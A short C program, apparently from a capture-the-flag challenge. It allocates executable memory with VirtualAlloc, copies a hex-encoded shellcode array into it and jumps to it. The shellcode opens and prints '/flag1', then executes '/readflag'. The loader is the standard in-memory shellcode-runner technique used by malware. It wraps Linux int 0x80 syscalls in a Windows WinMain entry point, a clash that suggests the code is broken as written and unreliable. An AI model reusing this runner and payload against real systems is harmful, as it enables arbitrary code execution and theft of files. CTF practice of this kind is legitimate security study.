#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "\x81\xec\xff\x00\x00\x00\xb8\x2f\x66\x6c\x61\x89\x04\x24\xb8\x67\x31\x00\x00\x89\x44\x24\x04\xb8\x05\x00\x00\x00\x31\xc9\x31\xd2\x89\xe3\xcd\x80\x81\xc4\xff\x00\x00\x00\x89\xc3\xb8\x03\x00\x00\x00\xba\xff\x00\x00\x00\x81\xec\xff\x00\x00\x00\x89\xe1\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x02\x00\x00\x00\x89\xe1\xcd\x80\x81\xc4\xff\x00\x00\x00\x81\xec\xff\x00\x00\x00\xb8\x2f\x72\x65\x61\x89\x04\x24\xb8\x64\x66\x6c\x61\x89\x44\x24\x04\xb8\x67\x00\x00\x00\x89\x44\x24\x08\xb8\x0b\x00\x00\x00\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x81\xc4\xff\x00\x00\x00\xc3";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{

    LPVOID buffer = VirtualAlloc(NULL, 8192, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memset(buffer, 0, 8192);

    void (*pcode)() = (void (*)())buffer;

    memcpy(buffer, shellcode, sizeof(shellcode));
    pcode();

    return 0;
}